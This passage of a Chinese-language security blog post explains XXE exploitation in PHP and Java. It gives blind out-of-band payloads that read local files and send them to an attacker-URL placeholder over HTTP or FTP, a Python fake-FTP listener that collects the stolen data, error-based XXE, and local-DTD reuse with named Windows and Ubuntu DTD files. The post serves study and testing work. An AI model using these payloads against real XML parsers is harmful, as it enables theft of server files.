+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">cdata</span> <span class="string">&quot;%start;%goodies;any;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763106899486-d9b2322f-0be3-4ebd-890d-1ca8790bb6ed.png"  alt="img"></p>
+<p>这样就能成功读取。</p>
+<h2 id="无回显（需外带）"><a href="#无回显（需外带）" class="headerlink" title="无回显（需外带）"></a>无回显（需外带）</h2><h3 id="一般打法（http）"><a href="#一般打法（http）" class="headerlink" title="一般打法（http）"></a>一般打法（http）</h3><p>php里很简单，直接编码外带就行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">roottag</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd;]&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;%send;</span><br></pre></td></tr></table></figure>
+
+<p>&#37;是%的html编码</p>
+<h3 id="失败1-1"><a href="#失败1-1" class="headerlink" title="失败1"></a>失败1</h3><p>java里的外带情况会复杂些，主要是因为url里会出现特殊字符。</p>
+<p>首先看一个失败的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">roottag</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://攻击机URL/?file=%file;&#x27;</span>&gt;</span></span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763109201746-0792b55b-b240-4c23-bbe9-7692ea2c808b.png"  alt="img"></p>
+<p>%file直接被原样带出了，并没有进行替换</p>
+<p>这是因为这个dtd中，%file位于%send的实体内容位置，所以会被作为字符串处理。</p>
+<p>那上面提到过</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">cdata</span> <span class="string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>%start;%goodies;%end;不也是出现在实体内容位置吗，为什么能够被展开。这是因为只有SYSTEM后面的实体内容才会被当作字符串。你想，SYSTEM后面原本就是用来调用外部dtd的，一般都是<a class="link"   target="_blank" rel="noopener" href="http://xxx,file//xxx%EF%BC%8C%E8%82%AF%E5%AE%9A%E5%BD%93%E4%BD%9C%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E3%80%82" >http://xxx，file://xxx，肯定当作字符串解析。<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;%send;</span><br></pre></td></tr></table></figure>
+
+<p>而这样写，在展开int时，识别到里面是dtd格式，于是会开启dtd解析，这时候，%file就会被识别为参数实体，从而成功展开。</p>
+<h3 id="特殊符号-1"><a href="#特殊符号-1" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>经过测试，发现http外带过程中，%，&amp;和\n（即文件有换行就无法带出）无法正常带出，其他应该可以。其中%，&amp;如果出现在文件末尾，可以闭合。</p>
+<p>dtd还是这个：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;%send;</span><br></pre></td></tr></table></figure>
+
+<p>为什么%和&amp;不行，而&lt;可以，我还不是特别理解，下面是目前的解释：</p>
+<p>1、展开%int后，进入dtd解析状态，将%send里面的%file展开后，如果还是有%，&amp;等字符，则又会触发实体解析，从而报错</p>
+<p>2、而&lt;&gt;!在SYSTEM中被认为是普通字符</p>
+<p>那能不能通过CDATA外带特殊符号呢?</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/target.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;%start;%file;%end;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%all;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;%send;</span><br></pre></td></tr></table></figure>
+
+<p>显然不行，因为刚刚讲了，在dtd解析的上下文环境中，&lt;!&gt;;这些在SYSTEM里根本不解析，但%一定会解析，所以还是相同的报错。</p>
+<p>那为什么http不能带出有换行的文件呢？这是由jdk代码决定的。</p>
+<p>8u65中的报错位置：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763121621839-6ca3acc4-78f6-4d81-a75a-778a3afbd091.png"  alt="img"></p>
+<p>各版本的报错代码不一样，不过都是不允许换行符。</p>
+<h3 id="ftp打法（"><a href="#ftp打法（" class="headerlink" title="ftp打法（&lt;7u131 &lt;8u131-b09）"></a>ftp打法（&lt;7u131 &lt;8u131-b09）</h3><p>ftp在jdk低版本下可以外带多行数据，常用于读目录。</p>
+<p>各版本ftp能否使用：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763122269620-057ca8c3-9609-4e7e-9de4-8f2a05d53fa5.png"  alt="img"></p>
+<p>xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:9999/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd;]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;ftp://127.0.0.1:7777/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%int;%send;</span><br></pre></td></tr></table></figure>
+
+<p>evilFTP.py用的heihu师傅的，python evilFTP.py 7777 result.txt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">IP = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">ADDR_MAIN = (IP, PORT)</span><br><span class="line">ADDR_EXT = (IP, <span class="number">63568</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_host_ip</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;8.8.8.8&#x27;</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">epsv</span>(<span class="params">s_ext</span>):</span><br><span class="line">    s_ext.bind(ADDR_EXT)</span><br><span class="line">    s_ext.listen()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    s_ext.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_null</span>(<span class="params">res</span>):</span><br><span class="line">    new = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="comment"># wait for 2th channel</span></span><br><span class="line">            new.append(i)</span><br><span class="line">    <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">connect</span>):</span><br><span class="line">    res = []</span><br><span class="line">    connect.send(<span class="string">b&quot;220 (vsFTPd 3.0.3)\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*]Waiting for data...&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = connect.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&gt;&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        rep = <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;USER &#x27;</span> == msg.decode()[:<span class="number">5</span>]:</span><br><span class="line">            data = msg.decode() + <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">            rep = <span class="string">b&#x27;331 Please specify the password.\n&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;PASS &#x27;</span> == msg.decode()[:<span class="number">5</span>]:</span><br><span class="line">            rep = <span class="string">b&#x27;230 Login successful.\n&#x27;</span></span><br><span class="line">            <span class="comment"># version = msg.decode()[5:].replace(&#x27;@&#x27;,&#x27;&#x27;)</span></span><br><span class="line">            data = msg.decode() + <span class="string">&#x27;\r\n\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="comment"># print(f&#x27;[*] The version is &#123;version&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;TYPE I&#x27;</span> == msg.decode()[:<span class="number">6</span>]:</span><br><span class="line">            rep = <span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;TYPE A&#x27;</span> == msg.decode()[:<span class="number">6</span>]:</span><br><span class="line">            rep = <span class="string">b&#x27;200 Switching to ASCII mode.\n&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;CWD &#x27;</span> == msg.decode()[:<span class="number">4</span>]:</span><br><span class="line">            data = msg.decode()[<span class="number">4</span>:]</span><br><span class="line">            rep = <span class="string">b&#x27;250 Directory successfully changed.\n&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;EPSV ALL&#x27;</span> == msg.decode()[:<span class="number">8</span>]:</span><br><span class="line">            rep = <span class="string">b&#x27;200 EPSV ALL ok.\n&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;EPSV&#x27;</span> == msg.decode()[:<span class="number">4</span>]:</span><br><span class="line">            s_ext = socket()</span><br><span class="line">            p_ext = Process(target=epsv, args=(s_ext,))</span><br><span class="line">            p_ext.start()</span><br><span class="line">            rep = <span class="string">b&#x27;229 Entering Extended Passive Mode (|||63568|)\n&#x27;</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)  <span class="comment"># wait for 2th channel</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;RETR &#x27;</span> == msg.decode()[:<span class="number">5</span>]:</span><br><span class="line">            data = msg.decode()[<span class="number">5</span>:]</span><br><span class="line">        res.append(data[:-<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&lt;-&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(rep)</span><br><span class="line">        connect.send(rep)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;RETR &#x27;</span> == msg.decode()[:<span class="number">5</span>]:</span><br><span class="line">            time.sleep(<span class="number">1</span>)  <span class="comment"># wait for 2th channel</span></span><br><span class="line">            p_ext.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;/&#x27;</span>.join(clear_null(res))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*]Listening <span class="subst">&#123;IP&#125;</span> on <span class="subst">&#123;PORT&#125;</span> and 63568...&#x27;</span>)</span><br><span class="line">    output = sys.argv[<span class="number">2</span>]</span><br><span class="line">    s = socket()</span><br><span class="line">    s.bind(ADDR_MAIN)</span><br><span class="line">    s.listen()</span><br><span class="line">    connect, addr = s.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*]Get connection from <span class="subst">&#123;addr&#125;</span>.&#x27;</span>)</span><br><span class="line">    data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = center(connect)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]Failed to get data.&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">if</span> data == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] ReadFile fail!!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[ ]Data has been written into <span class="subst">&#123;output&#125;</span>.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>特殊字符相关：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763133669016-7fd05a62-8483-4772-9efa-296a5c6d2c41.png"  alt="img"></p>
+<p>参考</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" >https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/<i class="fas fa-external-link-alt"></i></a></p>
+<p>高版本jdk修复</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763369075643-be9822fb-a69f-47a6-9f08-f047dfd90b10.png"  alt="img"></p>
+<h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>php中，允许参数实体内引用%</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">NUMBER</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;  &lt;!-- 定义file实体读取win.ini --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM </span></span></span><br><span class="line"><span class="string"><span class="meta">&amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"> &amp;#x25;eval;  &lt;!-- 展开eval实体 --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"> &amp;#x25;error; &lt;!-- 触发error实体 --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"> &#x27;</span>&gt;</span></span><br><span class="line"> %NUMBER; <span class="comment">&lt;!-- 执⾏嵌套实体 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>java得改一下</p>
+<h3 id="一般打法（出网）"><a href="#一般打法（出网）" class="headerlink" title="一般打法（出网）"></a>一般打法（出网）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://IP:PORT/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> %test;</span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
+
+<h3 id="特殊符号-2"><a href="#特殊符号-2" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>这里跟前面无回显的情况是一样的，&lt;!;&gt;能直接带出来，%，&amp;不行。</p>
+<p>同样，<![CDATA[]]>没有用。</p>
+<h3 id="不出网打法"><a href="#不出网打法" class="headerlink" title="不出网打法"></a>不出网打法</h3><p>原来是利用windows或linux原本的dtd文件，然后对里面的参数实体进行覆盖。</p>
+<p>windows存在 C:\Windows\System32\wbem\xml\cim20.dtd  </p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763207162584-ced45aba-9733-4a38-89cc-c395b07d9efb.png"  alt="img"></p>
+<p>这里SuperClass可用，其他的在第一次被引用时，都不位于最后，无法进行闭合，如ArraySize：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763207250164-285175e0-2e24-4f4e-ab82-f6080f417c14.png"  alt="img"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY % <span class="keyword">SuperClass</span> <span class="string">&#x27;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"> &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"> &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"> &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"> &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta"> &lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> %local_dtd;</span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里&#x26;#x25;先解析成&#x25;，再解析成%</p>
+<p>Windows上常用dtd<br>C:&#x2F;Windows&#x2F;System32&#x2F;wbem&#x2F;xml&#x2F;cim20.dtd<br>C:&#x2F;Windows&#x2F;System32&#x2F;wbem&#x2F;xml&#x2F;wmi20.dtd<br>C:&#x2F;Windows&#x2F;SysWOW64&#x2F;wbem&#x2F;xml&#x2F;cim20.dtd<br>C:&#x2F;Windows&#x2F;SysWOW64&#x2F;wbem&#x2F;xml&#x2F;wmi20.dtd</p>
+<p>linux系统中dtd文件视系统而定，比如Ubuntu中<br>&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd<br>constant可利用。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">constant</span> <span class="string">&#x27;int|double|string|matrix|bool|charset|langset|const&#x27;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">patelt</span> (%<span class="keyword">constant</span>;)*&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XwmsNWMwFIKUQUV6B9KAFw" >https://mp.weixin.qq.com/s/XwmsNWMwFIKUQUV6B9KAFw<i class="fas fa-external-link-alt"></i></a></p>
